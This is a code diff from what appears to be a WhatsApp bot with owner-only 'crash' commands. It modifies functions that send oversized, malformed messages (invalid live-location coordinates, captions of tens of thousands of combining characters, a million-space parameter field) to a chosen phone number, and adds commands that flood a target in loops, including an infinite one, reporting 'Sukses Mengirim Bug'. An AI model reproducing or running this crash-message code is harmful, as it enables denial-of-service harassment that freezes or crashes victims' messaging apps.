@@ -253,7 +253,7 @@ async function pirgam(target, kuwoted) {
         text: "›          #Nexzodominate"
       },
       nativeFlowMessage: {
-        messageParamsJson: " ".repeat(1000000)
+        messageParamsJson: " ".repeat(50000)
       }
     }
 }), { userJid: target, quoted: kuwoted });
@@ -290,7 +290,7 @@ message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `✳️᜴࿆͆᷍𝗡𝗘𝗫𝗭𝗢 𝗔𝗟𝗟𝗥𝗘𝗧 𝗘𝗥𝗥𝗢𝗥𝗥𝗥╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
+    "caption": `✳️᜴࿆͆᷍⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ิดุท้เึางืผิดุท้เึา⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
@@ -460,51 +460,48 @@ setInterval(() => {
 dropNumber()
 }, 400)}
 break
-case 'crashbrutal': { 
+case 'nexzo1': { 
 if (!isDeveloper) return m.reply('Fitur Ini Khusus Owner')
 if (!q) return reply(`Contoh : ${prefix+command} 628xxx`)
 let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return m.replay(`Eror | Contoh : ${prefix+command} 628xxx`)
 let target = bijipler + '@s.whatsapp.net'
-for (let j = 0; j < 10; j++) { 
-await saveCreds()
-await saveCreds()
-await saveCreds()
-await saveCreds()
-await pirgam(target, force)
-await ngeloc(target, force) 
+for (let j = 0; j < 30; j++) {
 await bakdok(target, force)
-await pirgam(target, force)
-await ngeloc(target, force) 
-await bakdok(target, force) 
-await pirgam(target, force)
-await ngeloc(target, force) 
+await ngeloc(target, force)
+await ngeloc(target, force)
 await bakdok(target, force)
-}
-reply('Sukses')}
+await ngeloc(target, force)
+await bakdok(target, force)
+await bakdok(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await bakdok(target, force)
+await ngeloc(target, force)
+await bakdok(target, force)
+await bakdok(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await bakdok(target, force)
+await ngeloc(target, force)
+await bakdok(target, force)
+await bakdok(target, force)
+await ngeloc(target, force)
+await ngeloc(target, force)
+await bakdok(target, force)
+await ngeloc(target, force)
+await bakdok(target, force)}
+reply('Sukses Mengirim Bug')}
 break
-case 'upsession': { 
-await saveCreds()
-m.reply('Done')
-}
-break
-case 'ios24j': case 'vios-unli': {
-if (!q) return m.reply(`Penggunaan .${command} 6287392784527`)
+case 'nexzo2': {
+if (!q) return m.reply(`Contoh : ${prefix+command} 628xxx`)
 let bijipler = q.replace(/[^0-9]/g, "")
 if (bijipler.startsWith('0')) return m.reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
-await m.reply('Sukses')
 let target = bijipler + '@s.whatsapp.net'
-  for (;;) {
-    await aipong(target)
-    await sleep(1200)
-  }
-}
-break
-case "add": { 
-if (!isDeveloper) return m.reply('Fitur Ini Khusus Owner')
-let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await Cexzas.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
-}
+for (;;) {
+await aipong(target, force)
+await sleep(10000)} 
+reply('Sukses')}
 break
 default:
 }}
